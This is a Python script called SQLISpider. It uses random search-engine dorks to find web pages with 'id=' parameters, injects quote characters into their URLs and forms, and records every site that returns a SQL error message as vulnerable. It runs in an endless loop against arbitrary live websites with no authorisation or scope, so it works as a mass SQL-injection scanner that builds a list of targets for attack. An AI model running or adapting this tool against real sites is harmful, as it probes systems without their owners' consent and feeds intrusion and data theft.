#!/usr/bin/python3
# -*- coding utf-8 -*-
# Author SourceCode347
# SQLISpider

license = '''
MIT License

Copyright (c) 2021 Nikolaos Bazigos

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

https://github.com/sourcecode347/SQLISpider/
'''

print(license)
import random,time,requests
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from termcolor import colored
from urllib.parse import urljoin
from random_word import RandomWords

r = RandomWords()
sqlilist="sqlilist.txt"

logo = '''
Simple

 _______  _______  _       _________   _______  _______ _________ ______   _______  _______ 
(  ____ \(  ___  )( \      \__   __/  (  ____ \(  ____ )\__   __/(  __  \ (  ____ \(  ____ )
| (    \/| (   ) || (         ) (     | (    \/| (    )|   ) (   | (  \  )| (    \/| (    )|
| (_____ | |   | || |         | |     | (_____ | (____)|   | |   | |   ) || (__    | (____)|
(_____  )| |   | || |         | |     (_____  )|  _____)   | |   | |   | ||  __)   |     __)
      ) || | /\| || |         | |           ) || (         | |   | |   ) || (      | (\ (   
/\____) || (_\ \ || (____/\___) (___  /\____) || )      ___) (___| (__/  )| (____/\| ) \ \__
\_______)(____\/_)(_______/\_______/  \_______)|/       \_______/(______/ (_______/|/   \__/

                                                                                            

Coded By SourceCode347
'''
print(colored(logo , "green"))
def openbrowser():
    global browser
    options = webdriver.FirefoxOptions()
    options.add_argument("--headless")
    browser = webdriver.Firefox(executable_path="/home/baz/Desktop/geckodriver",options=options)
    time.sleep(5)
def navigate(link):
    browser.get(link)
    time.sleep(8)
def is_vulnerable(source):
    """A simple boolean function that determines whether a page 
    is SQL Injection vulnerable from its `response`"""
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    }
    for error in errors:
        # if you find one of these errors, return True
        if error in source.lower():
            return True
    # no error detected
    return False
openbrowser()
while True:
   rnum = random.randint(0,3)
   if rnum ==0:
       dork = "https://duckduckgo.com/?q=php%3Fid%3D"+str(random.randint(0,100000))+"+"+r.get_random_word()+"&t=h_&ia=web"
   elif rnum ==1:
       dork = "https://duckduckgo.com/?q=inurl:%3Fid%3D"+str(random.randint(0,100000))+"&t=h_&ia=web"
   else:
       dork = "https://duckduckgo.com/?q="+r.get_random_word()+"+inurl:%3Fid%3D"+str(random.randint(0,100000))+"&t=h_&ia=web"
   navigate(dork)
   testlinks=[]
   for x in range(0,5):
       try:
           m=browser.find_element_by_partial_link_text("More Results")
           m.click()
           time.sleep(3)
       except:
           pass
   fl = browser.find_elements_by_xpath("//a[@class='result__url js-result-extras-url']")
   for l in fl:
       tl = l.text
       #print(tl)
       testlinks.append(tl)
   for tl in testlinks:
       try:
           if "=" in tl:
               navigate(tl.replace("=","='"))
               source = browser.page_source
               if is_vulnerable(source) == True:
                   print(tl , colored("Vuln Found" , "green" , attrs=['bold']))
                   with open(sqlilist,"a") as f:
                      f.write(tl+"\n")
                      f.close()
               else:
                   forms = browser.find_elements_by_xpath("//form")
                   print(f"[+] Detected {len(forms)} forms on {tl}.")
                   if len(forms) > 0:
                       for form in forms:
                           form_inputs = form.find_elements_by_xpath("//input")
                           action = form.get_attribute('action')
                           action=action.lower()
                           method = form.get_attribute('method')
                           method=method.lower()
                           for c in "\"'":
                               # the data body we want to submit
                               data = {}
                               for fi in form_inputs:
                                   if fi.get_attribute('value') or fi.get_attribute('type') == "hidden":
                                       # any input form that has some value or hidden,
                                       # just use it in the form body
                                       try:
                                           data[fi.get_attribute('name')] = fi.get_attribute('value') + c
                                       except:
                                           pass
                                   elif fi.get_attribute('type') != "submit":
                                       # all others except submit, use some junk data with special character
                                       data[fi.get_attribute('name')] = f"test{c}"
                               # join the url with the action (form request URL)
                               url = urljoin(tl, action)
                               if method == "post":
                                   res = requests.post(url, data=data)
                                   source=res.text
                               elif method == "get":
                                   res = requests.get(url, data=data)
                                   source=res.text
                               # test whether the resulting page is vulnerable
                               if is_vulnerable(source) == True:
                                   #print("[+] SQL Injection vulnerability detected, link:", url)
                                   print(tl , colored("Vuln Found" , "green" , attrs=['bold']))
                                   with open(sqlilist,"a") as f:
                                      f.write(tl+"\n")
                                      f.close()
                                      break
                               else:
                                   print(tl , colored("Not Found" , "red" , attrs=['bold']))
                   else:
                       print(tl , colored("Not Found" , "red" , attrs=['bold']))
       except:
           pass
   #browser.quit()
   #break
